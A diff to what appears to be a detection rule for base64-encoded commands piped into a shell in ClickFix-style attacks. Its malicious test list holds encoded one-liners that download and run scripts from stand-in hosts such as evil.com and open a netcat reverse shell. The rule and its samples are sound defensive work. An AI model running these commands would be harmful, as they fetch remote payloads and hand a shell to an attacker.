@@ -4,7 +4,7 @@ description: >
   Detects base64 encoded commands decoded and executed in shell. Common in Linux/macOS ClickFix attacks.
 
 pattern: |
-  (?i)echo.*\|.*base64.*(--decode|-d)|base64.*(--decode|-d).*\|.*(bash|sh|zsh|eval)
+  (?i)(echo.*\|.*base64.*(--decode|-d)|base64.*(--decode|-d).*\|.*(bash|sh|zsh|eval))
 
 malicious:
   - 'bash -c "echo SGFja2Vk | base64 -d | bash"'
@@ -15,7 +15,7 @@ malicious:
   - 'bash -c "echo d2dldCBodHRwOi8vZXZpbC5jb20vbWFsd2FyZS5zaA== | base64 --decode | bash"'
   - 'sh -c "echo Y3VybCAtcyBodHRwOi8vYXR0YWNrZXIuY29tL2Ryb3BwZXIuc2g= | base64 -d | sh"'
   - 'bash -c "echo bmMgLWUgL2Jpbi9iYXNoIGV2aWwuY29tIDQ0NDQ= | base64 -d"'
-  - 'sh -c "echo cHl0aG9uIC1jICdleGVjKC4uLik=' | base64 --decode"'
+  - 'sh -c "echo cHl0aG9uIC1jICdleGVjKC4uLik='' | base64 --decode"'
   - 'bash -c "echo $(echo bWFsaWNpb3VzX2NvbW1hbmQ= | base64 -d)"'
   - "echo Y3VybCBodHRwOi8vZXZpbC5jb20vc2NyaXB0LnNofGJhc2g= | base64 -d | bash"
   - "echo d2dldCAtcU8tIGh0dHA6Ly9ldmlsLmNvbS9wYXlsb2FkLnNofHNo | base64 --decode | sh"
@@ -46,7 +46,7 @@ benign:
   - 'bash -c "echo $PATH"'
   - "sh local_script.sh"
   - "bash /usr/local/bin/script.sh"
-  - "sh -c 'find . -name \"*.log\"'"
+  - 'sh -c ''find . -name "*.log"'''
   - "bash -c 'tail -f /var/log/syslog'"
   - "sh -c 'top -b -n 1'"
   - "echo test"
